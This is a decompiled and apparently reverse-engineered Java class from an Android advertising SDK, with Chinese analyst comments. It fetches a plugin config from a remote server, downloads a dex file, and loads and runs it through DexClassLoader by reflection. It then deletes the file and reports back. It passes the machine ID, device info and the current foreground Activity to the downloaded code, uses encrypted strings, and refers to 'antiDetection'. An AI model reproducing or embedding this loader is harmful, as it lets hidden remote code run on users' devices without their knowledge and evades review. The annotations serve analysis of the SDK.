package com.kkwinter.thirdsdk.advsdk.b;

import android.app.Activity;
import android.app.Application;
import android.app.Application.ActivityLifecycleCallbacks;
import android.content.Context;
import android.os.Bundle;
import android.os.Build.VERSION;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;

import org.json.JSONException;
import org.json.JSONObject;


/**
 * 核心业务逻辑入口
 */
public final class a {
    private static a a = null;

    private Context b = null;
    private Method c = null;
    private Class<?> d = null;   //dex中，目标类的字节码文件
    private Object e = null;
    private Object f = null;   //DexClassLoader对象实例
    private boolean g;
    private boolean h;
    private int i = 5;
    private boolean j;
    private String k = "";     //文件路径
    private long l = 0L;       //时间戳
    private HashMap<String, Object> m = null;  //
    private static String n = com.kkwinter.thirdsdk.advsdk.b.i.a("DpmNU4uLIZTFl1zvpPaPsUrxVw==");   //  /adv/pluginFeedback
    private static String o = com.kkwinter.thirdsdk.advsdk.b.i.a("DpmNU4uLIZTFl1z7pOI=");           //  /adv/pluginReq

    //单例获取对象
    public static synchronized a a(Context var0) {
        return a != null ? a : (a = new a(var0));
    }

    //构造方法
    private a(Context var1) {
        this.b = var1;

        this.g = false;
        this.h = false;

        this.j = false;
        this.m = new HashMap();
        this.l = System.currentTimeMillis() / 1000L;

        String var2 = com.kkwinter.thirdsdk.advsdk.b.e.a.a("ly_0325_s" + com.kkwinter.thirdsdk.advsdk.b.i.a("fpuIRsyeDKX0"));  // ly_0325_s_cacheADV
        if (VERSION.SDK_INT < 21) {
            var2 = var2.substring(0, 7);
            this.k = var1.getCacheDir() + com.kkwinter.thirdsdk.advsdk.b.i.a("DpmNU+C5Yg==") + var2 + com.kkwinter.thirdsdk.advsdk.b.i.a("D5yMXQ==");  //    /advDB/ly_0325_s_cacheADV.dex
        } else {
            this.k = var1.getCacheDir() + com.kkwinter.thirdsdk.advsdk.b.i.a("DpmNU+C5Yg==") + var2 + com.kkwinter.thirdsdk.advsdk.b.i.a("D5yL");      //    /advDB/ly_0325_s_cacheADV.db
        }
    }

    //总入口
    public final void a(final String var1, long var2) {   // var1: action

        q.a(new Runnable() {

            public final void run() {

                com.kkwinter.thirdsdk.advsdk.b.l.a(a.this.b);  //l 准备参数

                a.this.g = false;
                a.this.a();

                //开子线程
                (new Thread(new Runnable() {
                    public final void run() {
                        synchronized (com.kkwinter.thirdsdk.advsdk.b.a.a) {
                            if (!a.this.g) {
                                if (!a.this.j) {
                                    StringBuilder var2 = new StringBuilder();

                                    try {
                                        a.this.j = a.this.a(var1, var2);


                                    } catch (Exception var4) {
                                        var2.append(com.kkwinter.thirdsdk.advsdk.b.i.a("er2RRsGLOYjNkA8=") + var4.getMessage() + com.kkwinter.thirdsdk.advsdk.b.i.a("fNg="));
                                        var2.append(var4.getMessage());
                                        a.this.j = false;
                                    }


                                    //重试机制，重试i次
                                    if (!a.this.j && a.this.i > 0) {
                                        a.this.i--;
                                        a.this.a(var1, 10000L);
                                        a.this.g = true;
                                    } else {
                                        a.this.g = false;
                                    }
                                }
                            }
                        }
                    }
                })).start();
            }
        }, var2);
    }


    /**
     * 网络请求、下载、调起、上报
     * 整个流程是否成功
     *
     * @param var1
     * @param var2
     * @return true 一直到调起dex成功
     */
    protected final boolean a(String var1, StringBuilder var2) throws JSONException {

        com.kkwinter.thirdsdk.advsdk.b.b.a();
        JSONObject var3;


        // TODO: /adv/pluginReq 请求   var3是response
        if ((var3 = com.kkwinter.thirdsdk.advsdk.b.c.a(this.b, o, var1, var2)) == null) {
            return false;
        } else {
            //requestID
            String var11 = r.a(r.a(var3, com.kkwinter.thirdsdk.advsdk.b.i.a("QpeESMuV")), com.kkwinter.thirdsdk.advsdk.b.i.a("U52YUMGIOajm"), "");  // common   requestID

            JSONObject var9 = r.a(var3 = com.kkwinter.thirdsdk.advsdk.b.b.a(var3), com.kkwinter.thirdsdk.advsdk.b.i.a("UZScQs2V"));   //plugin
            String var4 = r.a(var9, com.kkwinter.thirdsdk.advsdk.b.i.a("TJzc"), "");                           // md5
            String var5 = r.a(var9, com.kkwinter.thirdsdk.advsdk.b.i.a("RZeeS8iULIXvn1vHlOGH"), "");           // downloadMainUrl
            String var6 = r.a(var9, com.kkwinter.thirdsdk.advsdk.b.i.a("RZeeS8iULIXvl0DbruG+oUc="), "");       // downloadMirrorUrl
            //packageName
            String var7 = r.a(var9 = r.a(var9, com.kkwinter.thirdsdk.advsdk.b.i.a("QJadTOCeOYTBilvGrw==")), com.kkwinter.thirdsdk.advsdk.b.i.a("UZmKTsWcKK/Dk1c="), "");  // antiDetection    packageName

            //pakcageName.className [全路径名]
            String var8;
            if (!(var8 = r.a(var9, com.kkwinter.thirdsdk.advsdk.b.i.a("QpSIVte1LIzH"), "")).startsWith(var7)) {  // className
                var8 = var7 + com.kkwinter.thirdsdk.advsdk.b.i.a("Dw==") + var8;
            }

            //methodName
            var1 = r.a(var9, com.kkwinter.thirdsdk.advsdk.b.i.a("TJ2dTcufA4DPmw=="), "");  // methodName

            // TODO: 会从pluginReq的response中获取到下载连接，用于下载文件，并保存到k目录下
            if (!com.kkwinter.thirdsdk.advsdk.b.c.a(var5, var6, var4, this.k, var2)) {           // downloadMainUrl 下载到 k 目录下 ，是否下载成功

                // TODO:  下载成功和失败，都会有pluginFeedback上报
                //下载失败
                this.a(var4, var11, 0, var2.toString());
                return false;
            } else {

                // TODO: 下载成功，会通过dexclassloader把下载的包调起
                boolean var10 = this.a(this.k, var8, var1, var11, var2);  // 调起dex
                p.e(this.k);                                              // 调起之后，删除文件
                this.a(var4, var11, var10 ? 1 : 0, var2.toString());      // plugibFeedback上报
                return var10;
            }
        }
    }


    /**
     * dexclassloader调起dex
     *
     * @param var1 文件路径    >> /data/data/com.kkwinter.thirdsdk/cache/advDB/ly_0325_s_cacheADV.dex
     * @param var2 类全路径名  >> com.power.ttook.advworkflow.entry.WorkFlowEntry
     * @param var3 method     >> run
     * @param var4 requestID
     * @param var5 sb记录错误信息
     * @return  返回的结果是，dexclassloader调起是否成功
     */
    private boolean a(String var1, String var2, String var3, String var4, StringBuilder var5) {
        if (var5 == null) {
            var5 = new StringBuilder();
        }

        //f dexclassloader实例对象
        //d dex中目标类的class文件

        String var8;
        if (this.d == null) {
            Class var6;
            try {
                var6 = Class.forName(com.kkwinter.thirdsdk.advsdk.b.i.a("RZmFU82QY5LbjUbMrL2vtlPRUCH5BFskhCqeIQ=="));      // dalvik.system.DexClassLoader
            } catch (Exception var14) {
                var5.append(com.kkwinter.thirdsdk.advsdk.b.i.a("er2RRsGLOYjNkA8=") + var14.getMessage() + com.kkwinter.thirdsdk.advsdk.b.i.a("fNg="));   // [Exception= ]
                var6 = null;
            }

            if (var6 == null) {
                var5.append(com.kkwinter.thirdsdk.advsdk.b.i.a("ZZ2RZsiaPpLukVPNpOEMYpB2hM1v2o+ueeY="));               // DexClassLoader类不存在
                return false;
            }

            try {
                Constructor var7;
                (var7 = var6.getConstructor(String.class, String.class, String.class, ClassLoader.class)).setAccessible(true);
                var8 = p.b(var1);  // 获取父目录
                if (VERSION.SDK_INT < 21) {
                    var8 = this.b.getFilesDir().getAbsolutePath();
                }

                this.f = var7.newInstance(var1, var8, null, this.b.getClassLoader());        // 获取DexClassLoader对象实例
            } catch (Exception var13) {
                var5.append(com.kkwinter.thirdsdk.advsdk.b.i.a("er2RRsGLOYjNkA8=") + var13.getMessage() + com.kkwinter.thirdsdk.advsdk.b.i.a("fNg="));   // [Exception=  ]
                this.f = null;
            }

            if (this.f == null) {
                var5.append(com.kkwinter.thirdsdk.advsdk.b.i.a("ZZ2RZsiaPpLukVPNpOEOfbV2gstv/4yuXvQe96K/wAs="));           //DexClassLoader实例创建失败
                return false;
            }

            try {
                Method var18;
                (var18 = var6.getMethod(com.kkwinter.thirdsdk.advsdk.b.i.a("TZeIQeeXLJLR"), String.class)).setAccessible(true);    //loadClass
                this.d = (Class) var18.invoke(this.f, var2);                                          // 获取dex中，类的字节码文件
            } catch (Exception var12) {
                var5.append(com.kkwinter.thirdsdk.advsdk.b.i.a("er2RRsGLOYjNkA8=") + var12.getMessage() + com.kkwinter.thirdsdk.advsdk.b.i.a("fNg="));   // [Exception= ]
                this.d = null;
            }

            if (this.d == null) {
                var5.append(var2 + com.kkwinter.thirdsdk.advsdk.b.i.a("xklSwDhTCaT6GooEJyFKNbcb2sk0kp/7"));                // 类在DEX中没有找到
                return false;
            }
        }

        //e dex中目标类的实例对象

        // 类的实例
        if (this.e == null) {
            try {
                Method var16;
                (var16 = this.d.getDeclaredMethod(com.kkwinter.thirdsdk.advsdk.b.i.a("UpCIV8GyI5LWn1zKpA=="))).setAccessible(true);   //shareInstance
                this.e = var16.invoke(this.d);
            } catch (Exception var11) {
                var5.append(com.kkwinter.thirdsdk.advsdk.b.i.a("er2RRsGLOYjNkA8=") + var11.getMessage() + com.kkwinter.thirdsdk.advsdk.b.i.a("fNg="));   // [Exception= ]
                this.e = null;
            }

            if (this.e == null) {
                var5.append(var2 + com.kkwinter.thirdsdk.advsdk.b.i.a("xklSwj5/qE88GowiJBtwNpAo2eQ7n6Pu"));                         //类的实例创建失败
                return false;
            }
        }

        //c dex中，目标类中的，初始化方法method var3

        // method方法
        if (this.c == null) {
            try {
                this.c = this.d.getDeclaredMethod(var3, Context.class, ClassLoader.class, String.class, String.class, String.class, JSONObject.class, HashMap.class);
                this.c.setAccessible(true);
            } catch (Exception var10) {
                var5.append(com.kkwinter.thirdsdk.advsdk.b.i.a("er2RRsGLOYjNkA8=") + var10.getMessage() + com.kkwinter.thirdsdk.advsdk.b.i.a("fNg="));    // [Exception= ]
                this.c = null;
            }

            if (this.c == null) {
                var5.append(var2 + com.kkwinter.thirdsdk.advsdk.b.i.a("AR9zoUF+6AQtXdQ/eHVYRgM=") + var3 + com.kkwinter.thirdsdk.advsdk.b.i.a("CB5bhEJnxAcrQNchcQ=="));  // var2 的入口方法( var3 )没有找到
                return false;
            }
        }


        boolean var17 = false;

        try {
            l var19;
            var8 = (var19 = com.kkwinter.thirdsdk.advsdk.b.l.a(this.b)).a();   //machineid
            var1 = "ly_0325_s";                                         //模块名称

            //调起初始化方法  e: 目标类对象   b:context  f:classloader对象   var1： 模块名    var8：machineid    var19.b()：设备信息json    m:
            Boolean var15 = (Boolean) this.c.invoke(this.e, this.b, this.f, var1, var8, var4, var19.b(), this.m);     // 调起method方法
            this.m.put(com.kkwinter.thirdsdk.advsdk.b.i.a("RJadV92uH60="), com.kkwinter.thirdsdk.advsdk.b.n.a(this.b).a());   // entryURL    当前请求的url
            if (var15) {
                var17 = var15;
            }
        } catch (Exception var9) {
            var5.append(com.kkwinter.thirdsdk.advsdk.b.i.a("er2RRsGLOYjNkA8=") + var9.getMessage() + com.kkwinter.thirdsdk.advsdk.b.i.a("fNg="));    // // [Exception= ]
            var17 = false;
        }

        if (!var17) {
            var5.append(var2 + com.kkwinter.thirdsdk.advsdk.b.i.a("xklSwj5/qGQHG70KJwVSNZgHFA==") + var3 + com.kkwinter.thirdsdk.advsdk.b.i.a("CNgBlScc2UlHWoNBdTY="));  // var2 类的入口方法( var3 ) 调用失败
        }

        return var17;
    }


    // pluginFeedback 请求上报
    // md5   requesID   var3： 0 失败，1 成功
    private void a(String var1, String var2, int var3, String var4) {
        long var5 = System.currentTimeMillis() / 1000L - this.l;
        com.kkwinter.thirdsdk.advsdk.b.c.a(this.b, n, var1, var2, var3, var5, var4);
    }


    //监听应用内所有activity的生命周期
    protected final void a() {
        if (!this.h) {

            Context var1 = this.b;
            boolean var2 = this.b instanceof Application;
            boolean var3 = var1 instanceof Activity;

            Application var4;
            if ((var4 = (Application) (var2 ? var1 : (var3 ? var1.getApplicationContext() : null))) != null) {
                this.h = true;
                var4.registerActivityLifecycleCallbacks(new ActivityLifecycleCallbacks() {
                    public final void onActivityCreated(Activity var1, Bundle var2) {
                    }

                    public final void onActivityStarted(Activity var1) {
                        a.this.m.put(com.kkwinter.thirdsdk.advsdk.b.i.a("VZeZZMePJJfLiks="), var1);   // topActivity
                    }

                    public final void onActivityResumed(Activity var1) {
                    }

                    public final void onActivityPaused(Activity var1) {
                    }

                    public final void onActivityStopped(Activity var1) {
                        a.this.m.remove(com.kkwinter.thirdsdk.advsdk.b.i.a("VZeZZMePJJfLiks="));       // topActivity
                    }

                    public final void onActivitySaveInstanceState(Activity var1, Bundle var2) {
                    }

                    public final void onActivityDestroyed(Activity var1) {
                    }
                });
            }
        }
    }


}
